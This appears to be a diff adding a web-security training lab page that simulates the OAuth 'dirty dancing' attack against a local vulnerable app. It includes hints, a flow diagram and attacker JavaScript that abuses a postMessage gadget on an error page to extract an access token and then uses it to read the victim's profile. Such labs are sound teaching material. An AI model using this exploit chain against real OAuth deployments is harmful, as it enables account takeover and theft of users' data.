@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: State Manipulation + PostMessage Gadget - OAuth Level 2</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">OAuth #2: Dirty Dancing - State + PostMessage</span>
+      <span class="difficulty hard">Hard</span>
+    </div>
+  </div>
+
+  <div id="solve-banner" class="solve-banner"></div>
+
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Steal the victim's OAuth token using the "dirty dancing" technique. Break the OAuth flow by sending an invalid state, then use the postMessage analytics gadget on the error page to steal the token from the URL.</p>
+      </div>
+
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The dirty dancing setup</button>
+        <div class="hint-content">
+          1. Start an OAuth flow with <code>response_type=token</code> (implicit flow) so the token goes in the URL fragment<br>
+          2. Use an invalid/attacker-controlled <code>state</code> parameter<br>
+          3. When the victim authenticates, they get redirected with the token in the URL<br>
+          4. The callback page sees invalid state and shows an error, BUT the token is still in the URL
+        </div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: The postMessage gadget</button>
+        <div class="hint-content">The OAuth error page loads a jQuery analytics script that has a postMessage listener. It responds to messages with <code>{type:'getAnalytics'}</code> by sending back the current page URL — which contains the token! Open the error page in an iframe or popup, then send it a postMessage to steal the URL.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Full attack chain</button>
+        <div class="hint-content">
+          1. Open <code>/oauth/authorize?client_id=vuln-app&response_type=token&state=INVALID&redirect_uri=http://localhost:3000/oauth/callback</code> in a popup<br>
+          2. Victim authenticates (pre-filled for demo)<br>
+          3. Gets redirected to <code>/oauth/callback?error=invalid_state#access_token=TOKEN</code><br>
+          4. Error page has analytics gadget listening for postMessage<br>
+          5. From attacker page, send <code>{type:'getAnalytics'}</code> to the popup<br>
+          6. Error page responds with URL containing the token<br>
+          7. Parse the token from the URL!
+        </div>
+      </div>
+
+      <h3>Attack Flow Diagram</h3>
+      <div class="source-code">
+<pre><span class="comment">/* Dirty Dancing Attack Flow */</span>
+
+Attacker                    Victim                   OAuth Provider
+  |                           |                          |
+  |-- 1. Send crafted link -->|                          |
+  |   (invalid state,         |                          |
+  |    response_type=token)   |                          |
+  |                           |-- 2. Authenticate ------>|
+  |                           |                          |
+  |                           |<- 3. Redirect w/ token --|
+  |                           |   /callback?error=...    |
+  |                           |   #access_token=TOKEN    |
+  |                           |                          |
+  |-- 4. postMessage -------->|  (error page gadget)     |
+  |   {type:'getAnalytics'}   |                          |
+  |                           |                          |
+  |<- 5. URL with token ------|                          |
+  |   (analytics response)    |                          |
+  |                           |                          |
+  |-- 6. Use token to ATO! -->|                          |
+</pre>
+      </div>
+    </div>
+
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form" style="border:1px solid var(--danger);background:rgba(239,68,68,0.05)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Dirty Dancing Attack Console</h2>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px">This simulates the attacker's page performing the dirty dancing attack.</p>
+
+          <h4 style="color:var(--text-muted);margin-bottom:8px">Step 1: Launch OAuth flow with invalid state</h4>
+          <button class="btn btn-danger" onclick="launchOAuth()">Open OAuth Popup (victim authenticates)</button>
+          <div id="step1-status" style="margin-top:8px;font-size:13px"></div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--text-muted);margin-bottom:8px">Step 2: Wait for victim to authenticate, then steal URL via postMessage</h4>
+          <button class="btn btn-danger" onclick="stealToken()" id="step2-btn" disabled>Send postMessage to steal URL</button>
+          <div id="step2-status" style="margin-top:8px;font-size:13px"></div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--text-muted);margin-bottom:8px">Step 3: Use stolen token</h4>
+          <button class="btn btn-danger" onclick="useToken()" id="step3-btn" disabled>Fetch victim's profile with stolen token</button>
+          <div id="step3-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console" style="border-color:#8b0000">
+            <div class="title" style="color:#ff4444">Attack Log</div>
+            <div id="attack-log">
+              <div class="log" style="color:var(--text-muted)">Ready. Click Step 1 to begin the dirty dancing attack.</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console" style="border-color:#8b6900">
+            <div class="title" style="color:var(--warning)">Stolen Data</div>
+            <div id="stolen-data">
+              <div class="log" style="color:var(--text-muted)">No data stolen yet...</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border-radius:8px">
+          <p style="font-size:13px;color:var(--text-muted)">
+            <strong>Real-world context:</strong> The "Dirty Dancing" technique was discovered by Frans Rosen. It exploits the fact that OAuth tokens/codes remain in the URL even after errors. Combined with postMessage gadgets (analytics, chat widgets, error tracking), an attacker can extract these tokens from the error page without needing XSS. This works on major OAuth providers including Google, Microsoft, and Facebook.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    var oauthPopup = null;
+    var stolenToken = null;
+    var log = document.getElementById('attack-log');
+    var stolenDiv = document.getElementById('stolen-data');
+
+    function launchOAuth() {
+      // Step 1: Open OAuth flow with invalid state + implicit flow (token in fragment)
+      var url = '/oauth/authorize?client_id=vuln-app&response_type=token&state=ATTACKER_INVALID_STATE_123&redirect_uri=' +
+        encodeURIComponent('http://localhost:3000/oauth/callback');
+
+      log.innerHTML += '<div class="log">Opening OAuth popup with invalid state...</div>';
+      log.innerHTML += '<div class="log">URL: ' + url + '</div>';
+      log.innerHTML += '<div class="log" style="color:var(--warning)">Victim will authenticate, then get error page with token in URL</div>';
+
+      oauthPopup = window.open(url, 'oauthPopup', 'width=500,height=600');
+
+      document.getElementById('step1-status').innerHTML =
+        '<span style="color:var(--success)">OAuth popup opened. Click "Authorize & Sign In" in the popup, then proceed to Step 2.</span>';
+      document.getElementById('step2-btn').disabled = false;
+    }
+
+    function stealToken() {
+      if (!oauthPopup || oauthPopup.closed) {
+        log.innerHTML += '<div class="log" style="color:var(--danger)">Popup is closed! Restart from Step 1.</div>';
+        return;
+      }
+
+      log.innerHTML += '<div class="log">Sending postMessage to error page to steal URL...</div>';
+      log.innerHTML += '<div class="log">Message: {type: "getAnalytics"}</div>';
+
+      // The error page has an analytics gadget that responds with the page URL
+      oauthPopup.postMessage({ type: 'getAnalytics' }, '*');
+
+      document.getElementById('step2-status').innerHTML =
+        '<span style="color:var(--warning)">PostMessage sent. Waiting for response...</span>';
+
+      // Also try reading location directly (same-origin)
+      setTimeout(function() {
+        try {
+          var url = oauthPopup.location.href;
+          log.innerHTML += '<div class="log" style="color:var(--success)">Direct URL read (same-origin): ' + url.substring(0, 80) + '...</div>';
+
+          // Extract token from URL fragment
+          var hash = url.split('#')[1];
+          if (hash) {
+            var params = new URLSearchParams(hash);
+            var token = params.get('access_token');
+            if (token) {
+              stolenToken = token;
+              stolenDiv.innerHTML = '<div class="log" style="color:var(--danger)">STOLEN ACCESS TOKEN: ' + token + '</div>';
+              log.innerHTML += '<div class="log" style="color:var(--danger)">TOKEN STOLEN via direct URL read!</div>';
+              document.getElementById('step2-status').innerHTML =
+                '<span style="color:var(--danger)">Token stolen! Proceed to Step 3.</span>';
+              document.getElementById('step3-btn').disabled = false;
+            }
+          }
+        } catch(e) {
+          log.innerHTML += '<div class="log">Cannot read URL directly (cross-origin). Relying on postMessage gadget...</div>';
+        }
+      }, 2000);
+    }
+
+    // Listen for analytics gadget response
+    window.addEventListener('message', function(e) {
+      log.innerHTML += '<div class="log" style="color:var(--warning)">PostMessage received from: ' + e.origin + '</div>';
+      log.innerHTML += '<div class="log">Data: ' + JSON.stringify(e.data).substring(0, 200) + '</div>';
+
+      if (e.data && e.data.type === 'analyticsData' && e.data.url) {
+        var url = e.data.url;
+        stolenDiv.innerHTML += '<div class="log" style="color:var(--danger)">STOLEN URL via postMessage gadget: ' + url + '</div>';
+
+        var hash = url.split('#')[1];
+        if (hash) {
+          var params = new URLSearchParams(hash);
+          var token = params.get('access_token');
+          if (token) {
+            stolenToken = token;
+            stolenDiv.innerHTML += '<div class="log" style="color:var(--danger)">EXTRACTED TOKEN: ' + token + '</div>';
+            document.getElementById('step2-status').innerHTML =
+              '<span style="color:var(--danger)">Token stolen via postMessage gadget! Proceed to Step 3.</span>';
+            document.getElementById('step3-btn').disabled = false;
+          }
+        }
+      }
+    });
+
+    function useToken() {
+      if (!stolenToken) {
+        log.innerHTML += '<div class="log" style="color:var(--danger)">No token stolen yet!</div>';
+        return;
+      }
+
+      log.innerHTML += '<div class="log">Using stolen token to access victim\'s profile...</div>';
+
+      fetch('/oauth/userinfo', {
+        headers: { 'Authorization': 'Bearer ' + stolenToken }
+      })
+      .then(r => r.json())
+      .then(data => {
+        log.innerHTML += '<div class="log" style="color:var(--success)">Profile accessed successfully!</div>';
+        stolenDiv.innerHTML += '<div class="log" style="color:var(--danger)">VICTIM PROFILE DATA:</div>';
+        stolenDiv.innerHTML += '<div class="log">Username: ' + data.username + '</div>';
+        stolenDiv.innerHTML += '<div class="log">Email: ' + data.email + '</div>';
+        stolenDiv.innerHTML += '<div class="log">Role: ' + data.role + '</div>';
+        stolenDiv.innerHTML += '<div class="log" style="color:var(--danger)">ACCOUNT TAKEOVER ACHIEVED!</div>';
+
+        document.getElementById('step3-status').innerHTML =
+          '<span style="color:var(--danger)">ATO complete! Victim profile data stolen.</span>';
+
+        solveLab('oauth-2');
+      })
+      .catch(err => {
+        log.innerHTML += '<div class="log" style="color:var(--danger)">Error: ' + err.message + '</div>';
+      });
+    }
+  </script>
+</body>
+</html>
